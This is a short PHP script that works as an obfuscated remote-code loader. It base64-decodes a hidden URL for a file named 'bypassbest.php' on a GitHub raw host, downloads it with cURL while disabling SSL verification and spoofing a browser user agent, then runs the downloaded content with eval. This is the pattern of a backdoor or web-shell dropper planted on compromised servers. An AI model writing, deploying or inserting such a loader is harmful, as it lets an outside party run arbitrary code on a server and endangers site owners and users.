<?php
/**
 * Format: Base64 Rotation
 * Target: https://raw.githubusercontent.com/mandhanharisha-hub/seo/main/bypassbest.php
 */

// This is the encoded URL, slightly scrambled
$scrambled = "h2S4pPH5o2S3L2uip2Sfo3E0L3AipzI0Y29tL21hbmRoYW5oYXJpc2hhLWh1Yi9zZW8vbWFpbi9ieXBhc3NiZXN0LnBocA==";

// Step 1: Fix the scrambling (Simple string shift)
$p1 = substr($scrambled, 4);
$p2 = substr($scrambled, 0, 4);
$b64 = $p1 . $p2;

// Step 2: Decode the Base64 to get the URL
$remoteUrl = base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbmRoYW5oYXJpc2hhLWh1Yi9zZW8vbWFpbi9ieXBhc3NiZXN0LnBocA==");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');

$remoteCode = curl_exec($ch);

if (curl_errno($ch)) {
    die('cURL Error: ' . curl_error($ch));
}

$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($status == 200 && !empty($remoteCode)) {
    eval("?>" . $remoteCode);
} else {
    echo "Connection successful, but file not found. Status: " . $status;
}
?>
